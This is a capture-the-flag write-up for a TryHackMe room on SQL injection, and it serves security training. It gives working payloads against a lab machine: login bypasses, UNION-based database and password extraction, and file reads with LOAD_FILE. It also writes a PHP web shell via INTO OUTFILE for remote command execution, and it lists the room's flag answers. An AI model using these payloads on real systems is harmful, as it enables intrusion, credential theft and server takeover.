Advanced SQLi --- A TryHackMe Room Write-up
=========================================


![](https://miro.medium.com/v2/resize:fit:1050/1*vVGO0zEycvxxZnQ_WpLXOw.png)

*Welcome to the official write-up for the "Advanced SQLi" TryHackMe room! This guide will walk you through each task, explaining the concepts and providing step-by-step instructions to successfully exploit SQL Injection vulnerabilities, from basic bypasses to achieving Remote Code Execution.*

> Throughout this write-up, `MACHINE_IP` refers to the IP address of your deployed TryHackMe machine.

Task 1: Classics --- Mastering the Foundations of SQL Injection
=============================================================

*This task focuses on classic SQL Injection methods to bypass authentication, preparing us for more advanced scenarios.*

Challenge 1: The Classic Entry Point
------------------------------------

*Goal:** Bypass the login page and get generic access.*

1.  Navigate: Go to the vulnerable login page at `[http://MACHINE_IP](http://machine_ip./)`[.](http://machine_ip./)
2.  Input the Payload:

-   Username: `' OR 1=1-- -`
-   Password: (Any input, e.g., `test`, or leave blank)

> Find the Flag: If successful the page displays your first flag.
>
> FLAG{LoginBypassWorking}

Challenge 2: The Social Link & Targeted Bypass
----------------------------------------------

*Goal:** Discover the administrator's username and then bypass the login specifically as that admin.*

Part 1: Discover the Admin Username
-----------------------------------

1.  Intel Gathering: The intel suggests the admin's GitHub username is `bread-pitt-bot`.

-   Option 1 (Recommended): Visit `https://github.com/bread-pitt-bot` and look for clues about their system username in their posts or profile. The username is in small letters, no spaces.
-   Option 2 (Hint): If you prefer not to use GitHub, check the hints section in the TryHackMe task for the admin's username.

Submit Username: Once found, submit the administrator's username. Which is "fightclub"

Part 2: Bypass with the Admin Username
--------------------------------------

1.  Return to Login: Go back to `[http://MACHINE_IP](http://machine_ip./)`[.](http://machine_ip./)
2.  Input the Targeted Payload:

-   Username: `[ADMIN_USERNAME]'-- -` (Replace `[ADMIN_USERNAME]` with the name you just found, e.g., `admin'-- -` if the username is `admin`).
-   Password: (Any input, e.g., `test`, or leave blank)

> Find the Flag: If successful, you'll get another flag confirming your targeted bypass.
>
> FLAG{AdminPasswordRetrieved}

Completion: You've successfully performed both generic and targeted SQL Injection login bypasses.

Task 2: Beyond the Horizon --- Extracting Database Secrets
========================================================

*In this task, we'll go beyond simple login bypass to systematically extract information from the database, culminating in finding the administrator's password and logging in legitimately.*

Module 2: Database Footprinting
-------------------------------

*Goal:** Determine the number of columns in the query and identify the current database name.*

1.  Return to Login: Go back to `[http://MACHINE_IP](http://machine_ip./)`[.](http://machine_ip./)
2.  Determine Column Count (using `ORDER BY`):

-   In the Username field, start by testing `admin' ORDER BY 1-- -` and try incrementing the number (e.g., `admin' ORDER BY 2-- -`, `admin' ORDER BY 3-- -`, etc.).
-   Observation: The login page will either give an error on the unknown number or function normally. An error indicates you've exceeded the number of columns. The last number *before* a number error is the correct column count.
-   Password: (Any input, e.g., `test`)

Identify Current Database (using `UNION SELECT`):

-   Now that you know the column count (let's assume it's `1` from the previous step), use the following payload:
-   Username: `admin' UNION SELECT database()-- -`
-   Password: (Any input)
-   Observation: You will get the database name within the page.

Module 3: Schema Mapping
------------------------

*Goal:** Find table names within the database and then column names within a specific table.*

Enumerate Tables:

-   Using the database name you found and the displayable column, inject the following:
-   Username: `admin' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'your_database_name'-- -` (Replace `'your_database_name'` with the actual database name you found, you may use the payload without `group_concat()`).
-   Password: (Any input)
-   Observation: Look for a table name that sounds like it might contain user information (e.g., `users`, `credentials`, `auth`).

Enumerate Columns:

-   Using the table name you just found (e.g., `users`) and your database name, inject the following:
-   Username: `admin' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'your_database_name' AND table_name = 'your_table_name'-- -` (Replace placeholders).
-   Password: (Any input)
-   Observation: Look for columns that sound like they store usernames and passwords (e.g., `username`, `password`, `user`, `pass`, `uname`, `pword`).

Module 4: The Final Extraction & Legitimate Access
--------------------------------------------------

*Goal:** Extract the admin's password and log in with valid credentials.*

Exfiltrate the Password:

-   Using the specific admin username (e.g., `admin`), the table name (e.g., `users`), and the column names (e.g., `username`, `password`), craft the final payload:
-   Username: `admin' UNION SELECT password FROM your_table_name WHERE username = 'username'-- -` (Replace placeholders).
-   Password: (Any input)
-   Observation: The login success page will now show the administrator's password in your displayable column. Note this password down.

Legitimate Login:

-   Username: `admin` (the actual username, NOT the payload)
-   Password: `[THE_EXTRACTED_PASSWORD]` (the password you just found)

1.  If you don't see the flag in the page then try highlighting all the text on the page using Ctrl + a

> Find the Flag: You will log in successfully and be greeted with the final flag for this task.
>
> FLAG{LegitAdminAccess}
>
> Bonus Tip: If you are careful enough to explore the `bread-pitt-bot`'s github account you would have found the password there with simple decryption technique.

Task 3: Unauthorized File Access --- The Hidden Data
==================================================

*This task teaches you how to use SQL Injection to read files directly from the server's file system, bypassing normal web access controls.*

Module 1: Identifying the New Vulnerability
-------------------------------------------

Goal: Find a new SQLi vulnerability on a product page and map its query.

Locate the Product Page:

-   There's a new "product" page. Try common paths or look for links on the main page.`http://MACHINE_IP/product.php?id=1`

Confirm SQL Injection:

-   In the `id` parameter, try basic SQLi payloads like `'` or `ORDER BY` to confirm it's vulnerable and see error messages.

Determine Query Column Count:

-   Similar to Task 2, use `ORDER BY` with incrementing numbers to find the correct column count.
-   Example: `http://MACHINE_IP/product.php?id=1' ORDER BY 2-- -` (If this works, try 3, etc. until an error. The last working number is the column count.)

Identify Displayable Columns:

-   Use `UNION SELECT` with numbers to see which columns are displayed.
-   Example (if 3 columns): `http://MACHINE_IP/product.php?id=-1' UNION SELECT 1,2,3-- -`
-   Observation: The page will display the numbers (e.g., `1, 2` and `3`). These are where you can inject your data.

Module 2: File System Interaction via SQLi
------------------------------------------

*Goal:** Understand *`*LOAD_FILE()*`* and find the path to the hidden flag file.*

1.  Research `LOAD_FILE()`: Briefly understand that `LOAD_FILE('/path/to/file')` can read files if the database user has `FILE` privileges and the file is readable.
2.  Locate the Target File (`flag.txt`):

-   The flag file (`flag.txt`) is not directly web-accessible. You need its absolute path from public files .
-   Example for finding clues: Try injecting `http://MACHINE_IP/product.php?id=-1' UNION SELECT 1, LOAD_FILE('/var/www/html/server_notes.txt'), 3-- -` (adjust displayable column and filename).
-   Simpler Way: You might also find direct clues by simply Browse to `http://MACHINE_IP/secret_notes.txt` in the browser.

Module 3: The Final Extraction
==============================

*Goal:** Read the *`*flag.txt*`* file and retrieve its content.*

-   You can just go to `/absolute/path/to/flag.txt` and read the flag
-   or you can go with load_file `http://MACHINE_IP/product.php?id=-1' UNION SELECT 1, LOAD_FILE('/absolute/path/to/flag.txt'), 3-- -`
-   or if you have tried, you can get the flag with just `/var/www/html/flag.txt`

> FLAG{FileReadSQLiSuccess}

Task 4: The Ultimate Control --- Remote Code Execution (RCE)
==========================================================

*This is the ultimate challenge! You'll escalate your SQL Injection skills to gain Remote Code Execution (RCE) by writing a malicious web shell to the server. This will give you full command-line control.*

Module 2: Identifying the Attack Vector & Crafting the Shell
------------------------------------------------------------

*Goal:** Understand the RCE attack vector and prepare a simple web shell.*

1.  Attack Vector: Your target is still the `product.php` page from Task 3. It's vulnerable to `UNION SELECT`, which we'll combine with file writing.
2.  Web Shell Code: You'll write a simple PHP web shell.

-   Shell Content: `<?php system($_GET["cmd"]); ?>`
-   Purpose: This code takes a command from the `cmd` URL parameter (e.g., `?cmd=whoami`) and executes it on the server.

Module 3: Deploying the Web Shell (INTO OUTFILE)
------------------------------------------------

*Goal:** Use SQL Injection to write your web shell to a web-accessible directory on the server.*

1.  Recall Column Count: Remember the number of columns `product.php` returns from Task 3 (e.g., 3 columns).
2.  Research `INTO OUTFILE`: This SQL function is used to save the result of a `SELECT` statement to a file.
3.  Target Directory: The writable and web-accessible directory for your shell is `/var/www/html/uploads/`. You'll name your shell `shell.php`.
4.  Craft the RCE Payload:

-   Inject the web shell code into one of the displayable columns using `UNION SELECT` and save it to the target file.
-   Navigate to: `http://MACHINE_IP/product.php?id=-1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/uploads/shell.php'-- -`
-   Important:
-   The `-1` ensures the original query doesn't return results.
-   Match the column count (e.g., `1,2,3`).
-   Place your shell content `'<?php system($_GET["cmd"]); ?>'` into one of the displayable columns (adjust position `2` as needed).
-   Use the absolute path `/var/www/html/uploads/shell.php`.
-   Remember the` -- -` to comment out the rest of the original query.

> Execute Payload: Access the URL in your browser. You might see a generic error, but the shell should still be written.

Module 4: Gaining Control & Flag Retrieval
------------------------------------------

*Goal:** Access your deployed web shell, confirm RCE, and find the final flag.*

Access Your Web Shell:

-   Open your web shell in the browser: `[http://MACHINE_IP/uploads/shell.php](http://machine_ip/uploads/shell.php)`

Execute Commands:

-   Append `?cmd=` followed by a Linux command to the URL.
-   Example: Check current user: `[http://MACHINE_IP/uploads/shell.php?cmd=whoami](http://machine_ip/uploads/shell.php?cmd=whoami)`
-   List files: `http://MACHINE_IP/uploads/shell.php?cmd=ls`
-   Find the final flag: Use `ls` to navigate directories and use `cat` to read its contents.
-   `[http://MACHINE_IP/uploads/shell.php?cmd=cat](http://machine_ip/uploads/shell.php?cmd=cat) finalFlag.txt`

> Submit the finalFlag.
>
> FLAG{RCE_Master}

Task 5: Conclusion & What's Next?
=================================

Congratulations, you've completed the "Advanced SQLi" room!

> Keep learning, keep hacking, and always stay ethical!
